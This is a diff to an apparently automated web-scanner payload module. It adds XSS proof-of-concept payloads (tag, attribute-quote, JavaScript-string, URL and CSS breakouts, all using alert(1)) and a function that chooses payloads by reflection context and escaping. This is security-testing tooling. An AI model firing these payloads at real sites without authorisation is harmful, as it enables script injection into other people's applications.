@@ -67,22 +67,46 @@ SQLI: List[str] = (
 
 # ----------------------------- Cross-Site Scripting --------------------------
 
-# Tag/DOM-based (HTML contexts)
+# Tag/DOM-based (HTML contexts) - prioritized for html_body context
 XSS_TAG: List[str] = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
+    "<svg onload=alert(1)>",           # Most reliable, works in most contexts
+    "<img src=x onerror=alert(1)>",    # Classic, widely supported
+    "<script>alert(1)</script>",       # Traditional but often filtered
 ]
 
-# Attribute injection (often survives escaping in partial contexts)
+# Quote-balanced attribute breakouts (for attr + html escaping)
+XSS_ATTR_QUOTE_BALANCED: List[str] = [
+    "\" onmouseover=\"alert(1)\" x=\"",    # Double quote balanced
+    "' autofocus onfocus=alert(1) x='",    # Single quote balanced
+    "\" onfocus=alert(1) autofocus x=\"",  # Alternative double quote
+    "' onmouseover=alert(1) x='",          # Alternative single quote
+]
+
+# General attribute injection (fallback)
 XSS_ATTR: List[str] = [
     "\" onmouseover=\"alert(1)\" x=\"",
     "' autofocus onfocus=alert(1) x='",
 ]
 
-# URL-based (good for href/src-style sinks and headers)
+# JavaScript string breakouts (for js_string context)
+XSS_JS_STRING: List[str] = [
+    "\";alert(1);//",                   # Double quote + semicolon breakout
+    "';alert(1);//",                    # Single quote + semicolon breakout
+    "\";alert(1);var x=\"",             # Double quote with variable continuation
+    "';alert(1);var x='",               # Single quote with variable continuation
+]
+
+# URL-based (for url context)
 XSS_URL: List[str] = [
-    "javascript:alert(1)",
+    "javascript:alert(1)",              # Classic javascript: URI
+    "javascript:alert(1);void(0)",      # With void to prevent navigation
+    "data:text/html,<script>alert(1)</script>",  # Data URI
+]
+
+# CSS-based (conservative, minimal set)
+XSS_CSS: List[str] = [
+    "expression(alert(1))",             # IE expression (legacy)
+    "url(javascript:alert(1))",         # CSS url() with javascript:
 ]
 
 XSS: List[str] = XSS_TAG + XSS_ATTR + XSS_URL
@@ -173,6 +197,74 @@ def _filter_by_context(pool: List[str], family: str, context: Optional[Dict] = N
     return out or pool
 
 
+# ----------------------------- Context-Aware XSS Payload Selection -------------
+
+def payload_pool_for_xss(context: str, escaping: str) -> List[str]:
+    """
+    Return context-optimized XSS payload pool based on reflection context and escaping.
+    
+    Args:
+        context: XSS context type ("html_body", "attr", "js_string", "url", "css")
+        escaping: Escaping type ("raw", "html", "url", "js", "unknown")
+    
+    Returns:
+        List of payloads optimized for the given context, limited to top 3 families
+    """
+    if not context or context == "unknown":
+        # Fallback to general XSS pool
+        return XSS[:3]
+    
+    context = context.lower()
+    escaping = escaping.lower()
+    
+    # html_body context: prioritize tag-based vectors
+    if context == "html_body":
+        if escaping == "raw":
+            return XSS_TAG[:3]  # Raw reflection, use most effective tags
+        else:
+            # HTML-escaped, still try tags but they may be less effective
+            return XSS_TAG[:2] + XSS_ATTR[:1]
+    
+    # attr context: prioritize quote-balanced breakouts
+    elif context == "attr":
+        if escaping in ["html", "raw"]:
+            # HTML escaping or raw - use quote-balanced breakouts
+            return XSS_ATTR_QUOTE_BALANCED[:3]
+        else:
+            # Other escaping types - fallback to general attr
+            return XSS_ATTR[:3]
+    
+    # js_string context: prioritize quote + semicolon breakouts
+    elif context == "js_string":
+        if escaping in ["raw", "js"]:
+            # Raw or JS escaping - use JS string breakouts
+            return XSS_JS_STRING[:3]
+        else:
+            # Other escaping - try JS breakouts but may be less effective
+            return XSS_JS_STRING[:2] + XSS_TAG[:1]
+    
+    # url context: prioritize javascript: URIs
+    elif context == "url":
+        if escaping in ["raw", "url"]:
+            # Raw or URL escaping - use javascript: URIs
+            return XSS_URL[:3]
+        else:
+            # Other escaping - try URLs but may be less effective
+            return XSS_URL[:2] + XSS_TAG[:1]
+    
+    # css context: conservative approach
+    elif context == "css":
+        if escaping in ["raw", "css"]:
+            # Raw or CSS escaping - use CSS-specific payloads
+            return XSS_CSS[:2] + XSS_TAG[:1]
+        else:
+            # Other escaping - fallback to html_body approach
+            return XSS_TAG[:3]
+    
+    # Unknown context - fallback to general pool
+    else:
+        return XSS[:3]
+
 # ----------------------------- Public API ------------------------------------
 
 def payload_pool_for(family: str, context: Optional[Dict] = None) -> List[str]:
@@ -206,6 +298,7 @@ def iter_all_payloads() -> Iterable[str]:
 
 __all__ = [
     "SQLI", "XSS", "REDIRECT", "BASE", "SSTI",
+    "XSS_TAG", "XSS_ATTR", "XSS_ATTR_QUOTE_BALANCED", "XSS_JS_STRING", "XSS_URL", "XSS_CSS",
     "PAYLOADS_BY_FAMILY",
-    "payload_pool_for", "all_families", "iter_all_payloads",
+    "payload_pool_for", "payload_pool_for_xss", "all_families", "iter_all_payloads",
 ]
